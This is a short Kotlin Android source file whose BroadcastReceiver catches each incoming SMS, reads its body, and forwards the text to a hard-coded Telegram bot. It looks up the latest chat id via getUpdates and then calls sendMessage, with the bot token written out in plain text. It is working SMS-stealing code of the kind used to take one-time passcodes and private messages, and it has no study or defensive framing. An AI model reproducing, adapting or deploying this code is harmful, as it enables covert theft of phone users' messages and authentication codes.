package app.test

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.text.TextUtils
import android.util.Log
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.BufferedInputStream
import java.net.URL

class MyBroadcastReceiver: BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        Log.d("qwer", "${intent?.action}")

        val chatIdUrl = "https://api.telegram.org/bot7159690029:AAFMiAQAKEtdATCP0tuKrSYLku5cJg68gbk/getUpdates"
        val getUpdatesResult = arrayListOf<Char>()

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        val messageBody = messages[0].messageBody

        val scope = CoroutineScope(Dispatchers.Default)
        scope.launch {
            try {
                val url = URL(chatIdUrl)
                val connection = url.openConnection()
                val inputStream = BufferedInputStream(connection.getInputStream())
                while (true) {
                    val x = inputStream.read()

                    if (x < 0)
                        break

                    getUpdatesResult.add(x.toChar())
                }
                inputStream.read()
            } catch (ex: Exception) {
                Log.d("qwer", ex.toString())
            }
            val getUpdatesResultJSON = JSONObject(TextUtils.join("", getUpdatesResult))
            val array = getUpdatesResultJSON.getJSONArray("result")
            val chatId = array.getJSONObject(array.length()-1).getJSONObject("message").getJSONObject("chat").getLong("id")

            val bot = "https://api.telegram.org/bot7159690029:AAFMiAQAKEtdATCP0tuKrSYLku5cJg68gbk/sendMessage?chat_id=%s&text=%s"
            val messageUrlString = String.format(bot, chatId, messageBody)

            try {
                val url = URL(messageUrlString)
                val connection = url.openConnection()
                BufferedInputStream(connection.getInputStream())
            } catch (ex: Exception){
                Log.d("qwer", ex.toString())
            }

        }
    }
}